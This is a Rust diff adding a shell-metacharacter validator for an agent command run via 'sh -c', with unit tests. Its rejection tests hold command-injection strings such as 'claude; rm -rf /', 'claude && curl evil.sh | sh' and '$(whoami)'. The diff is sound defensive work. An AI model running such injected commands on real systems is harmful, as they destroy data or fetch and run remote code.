@@ -64,6 +64,36 @@ pub fn resolve_agent_command(derived: Option<&str>, config_override: Option<&str
     derived.or(config_override).unwrap_or("hr").to_string()
 }
 
+/// True if `command` is safe to interpolate into `sh -c <command>` (see [`build_shell_argv`])
+/// without unintended shell metacharacter expansion: rejects command/variable substitution,
+/// chaining, redirection, quoting, and newlines. Spaces and flags are allowed, so a real-world
+/// `agent_command` value like `"headroom wrap claude --memory"` still passes. `derived` (from
+/// `herdr agent list`) and `config_override` (the user's own `config.toml`) are both low-risk
+/// inputs already, but this catches a mistyped/malicious value before it reaches a shell.
+pub fn is_valid_agent_command(command: &str) -> bool {
+    !command.is_empty()
+        && !command.chars().any(|c| {
+            matches!(
+                c,
+                ';' | '&'
+                    | '|'
+                    | '$'
+                    | '`'
+                    | '<'
+                    | '>'
+                    | '('
+                    | ')'
+                    | '{'
+                    | '}'
+                    | '\n'
+                    | '\r'
+                    | '\\'
+                    | '"'
+                    | '\''
+            )
+        })
+}
+
 /// Build the argv to run `command` through an interactive instance of `shell`, so both a bare
 /// binary name (e.g. `"claude"`) and a shell alias/function defined in an rc file (e.g.
 /// `"hr"`) resolve correctly.
@@ -149,6 +179,15 @@ mod tests {
     }
 
     #[test]
+    fn resolve_preferred_agent_counts_by_frequency_not_by_seen_order() {
+        // "codex" is seen first but "claude" is reported twice — a naive "return the
+        // first-seen non-blank agent" implementation would wrongly return "codex" here.
+        let json = r#"{"agents":[{"agent":"codex"},{"agent":"claude"},{"agent":"claude"}]}"#;
+
+        assert_eq!(resolve_preferred_agent(json), Some("claude".to_string()));
+    }
+
+    #[test]
     fn resolve_agent_command_prefers_the_derived_agent() {
         assert_eq!(resolve_agent_command(Some("claude"), Some("hr")), "claude");
     }
@@ -223,5 +262,41 @@ mod tests {
     #[test]
     fn pick_in_progress_state_returns_none_for_an_empty_list() {
         assert_eq!(pick_in_progress_state(&[]), None);
+    }
+
+    #[test]
+    fn pick_in_progress_state_prefers_a_name_match_over_an_earlier_started_type() {
+        // "Todo" is `started`-typed and comes first — a wrongly-ordered `find`/`or_else`
+        // (type fallback checked before the name match) would return it instead of the
+        // later "In Progress" state.
+        let states = vec![
+            state("s1", "Todo", "started"),
+            state("s2", "In Progress", "started"),
+        ];
+
+        let picked = pick_in_progress_state(&states).unwrap();
+
+        assert_eq!(picked.id, "s2");
+    }
+
+    #[test]
+    fn is_valid_agent_command_accepts_plain_names_and_flags() {
+        assert!(is_valid_agent_command("claude"));
+        assert!(is_valid_agent_command("hr"));
+        assert!(is_valid_agent_command("/usr/local/bin/claude"));
+        assert!(is_valid_agent_command(
+            "headroom wrap claude --memory --code-graph"
+        ));
+    }
+
+    #[test]
+    fn is_valid_agent_command_rejects_shell_metacharacters() {
+        assert!(!is_valid_agent_command(""));
+        assert!(!is_valid_agent_command("claude; rm -rf /"));
+        assert!(!is_valid_agent_command("claude && curl evil.sh | sh"));
+        assert!(!is_valid_agent_command("claude $(whoami)"));
+        assert!(!is_valid_agent_command("claude `whoami`"));
+        assert!(!is_valid_agent_command("claude > /etc/passwd"));
+        assert!(!is_valid_agent_command("claude\nrm -rf /"));
     }
 }
